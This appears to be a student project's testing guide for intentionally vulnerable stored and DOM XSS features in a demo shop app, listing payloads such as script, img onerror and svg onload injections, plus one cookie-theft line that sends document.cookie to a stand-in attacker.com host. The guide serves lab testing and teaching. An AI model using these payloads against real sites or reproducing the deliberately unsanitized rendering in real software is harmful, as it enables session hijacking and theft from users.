# XSS Testing Guide - Fixed Version

## ✅ What Was Fixed

1. **Stored XSS (Reviews)**: Removed overly aggressive redirect protection that was disabling XSS
2. **DOM XSS (Cart)**: Improved element detection and event listener setup
3. **XSS Toggle**: Added easy enable/disable buttons on product pages

---

## 🧪 Testing Stored XSS (Reviews)

### Step 1: Enable XSS
1. Go to any product page (e.g., `/product/1`)
2. Click the **"⚠️ Enable XSS (Demo)"** button at the top
3. You should see it change to **"🚨 Disable XSS"**

**OR** use browser console:
```javascript
localStorage.setItem('xssEnabled', 'true');
location.reload();
```

### Step 2: Submit a Malicious Review
1. Fill in the review form:
   - **Name**: `Test User`
   - **Rating**: `5`
   - **Comment**: `<script>alert('Stored XSS!')</script>`
2. Click **"Submit Review"**

### Step 3: Verify Execution
- The page should reload
- The alert should appear immediately
- Check browser console for any errors

### Alternative Payloads:
```html
<!-- Simple alert -->
<script>alert('XSS')</script>

<!-- Image with onerror -->
<img src=x onerror=alert('XSS')>

<!-- SVG with onload -->
<svg onload=alert('XSS')>

<!-- Iframe -->
<iframe src=javascript:alert('XSS')></iframe>

<!-- Cookie theft (for demo) -->
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

---

## 🧪 Testing DOM XSS (Cart Promo Code)

### Step 1: Enable XSS
1. Go to `/cart` page
2. Open browser console (F12)
3. Run: `localStorage.setItem('xssEnabled', 'true')`
4. Refresh the page

**OR** enable it on a product page first, then go to cart

### Step 2: Enter Malicious Payload
1. In the **"Have a promo code?"** section
2. Enter in the promo code field:
   ```
   <img src=x onerror=alert('DOM XSS')>
   ```
3. Click **"Apply"** button

### Step 3: Verify Execution
- Alert should appear immediately
- Check browser console for: `[DOM XSS] XSS Active: true`

### Alternative Payloads:
```html
<!-- Image with onerror -->
<img src=x onerror=alert('DOM XSS')>

<!-- Script tag (may be blocked by browser) -->
<script>alert('DOM XSS')</script>

<!-- SVG -->
<svg onload=alert('DOM XSS')>

<!-- Style with expression (older browsers) -->
<style>body{background:url('javascript:alert("XSS")')}</style>
```

---

## 🔍 Troubleshooting

### Stored XSS Not Working?

1. **Check if XSS is enabled:**
   ```javascript
   localStorage.getItem('xssEnabled') // Should return 'true'
   ```

2. **Check if shouldRenderXSS is true:**
   - Open React DevTools
   - Check component state
   - `shouldRenderXSS` should be `true`

3. **Verify review was saved:**
   - Check browser Network tab
   - Look for POST to `/api/reviews`
   - Check response

4. **Check if review contains HTML:**
   - View page source
   - Search for your payload
   - Should see it in the HTML

5. **Browser XSS Protection:**
   - Some browsers block inline scripts
   - Try `<img src=x onerror=alert('XSS')>` instead
   - Or use event handlers: `<svg onload=alert('XSS')>`

### DOM XSS Not Working?

1. **Check if XSS is enabled:**
   ```javascript
   localStorage.getItem('xssEnabled') // Should return 'true'
   ```

2. **Check if elements exist:**
   ```javascript
   document.getElementById('applyCodeBtn') // Should not be null
   document.getElementById('promoCode')    // Should not be null
   document.getElementById('promoMessage')  // Should not be null
   ```

3. **Check console logs:**
   - Should see: `[DOM XSS] XSS Active: true`
   - If not, XSS flag is not set

4. **Verify event listener:**
   - Open DevTools → Elements
   - Find `applyCodeBtn`
   - Check Event Listeners tab
   - Should see click listener

5. **Try refreshing after enabling:**
   - Enable XSS
   - Refresh page
   - Try again

---

## 📝 Quick Test Commands

### Enable XSS (Browser Console):
```javascript
localStorage.setItem('xssEnabled', 'true');
location.reload();
```

### Disable XSS:
```javascript
localStorage.removeItem('xssEnabled');
location.reload();
```

### Check XSS Status:
```javascript
localStorage.getItem('xssEnabled'); // 'true' or null
```

### Test Stored XSS Payload:
```javascript
// Submit via API
fetch('/api/reviews?product_id=1', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    name: 'Test',
    rating: 5,
    comment: '<img src=x onerror=alert("XSS")>'
  })
}).then(() => location.reload());
```

---

## ✅ Expected Behavior

### Stored XSS:
1. Enable XSS → Button changes to "Disable XSS"
2. Submit review with payload → Review saved
3. Page reloads → Payload executes
4. Alert appears → XSS successful!

### DOM XSS:
1. Enable XSS → Flag set in localStorage
2. Go to cart page → Elements loaded
3. Enter payload → Type in promo code field
4. Click Apply → Payload executes
5. Alert appears → XSS successful!

---

## 🎯 Testing Checklist

- [ ] Stored XSS: Enable XSS button works
- [ ] Stored XSS: Submit review with `<script>` tag
- [ ] Stored XSS: Alert appears on page load
- [ ] Stored XSS: Works with `<img onerror>` payload
- [ ] DOM XSS: Enable XSS flag
- [ ] DOM XSS: Cart page loads correctly
- [ ] DOM XSS: Promo code input exists
- [ ] DOM XSS: Apply button works
- [ ] DOM XSS: Payload executes on click
- [ ] DOM XSS: Alert appears

---

## 🔧 If Still Not Working

1. **Clear browser cache and localStorage:**
   ```javascript
   localStorage.clear();
   location.reload();
   ```

2. **Check browser console for errors:**
   - Open DevTools (F12)
   - Check Console tab
   - Look for JavaScript errors

3. **Verify React state:**
   - Install React DevTools extension
   - Check component state
   - Verify `shouldRenderXSS` is `true`

4. **Test in different browser:**
   - Some browsers have stricter XSS protection
   - Try Chrome, Firefox, or Edge

5. **Check server logs:**
   - Review should be saved in database/JSON
   - Check `/api/reviews` endpoint

---

## 📚 For Your FYP Report

### Document:
1. **Vulnerability**: Stored XSS in reviews, DOM XSS in promo code
2. **Attack Vector**: User input → Database → Rendered without sanitization
3. **Impact**: Cookie theft, session hijacking, phishing
4. **Mitigation**: Input sanitization, output encoding, CSP headers
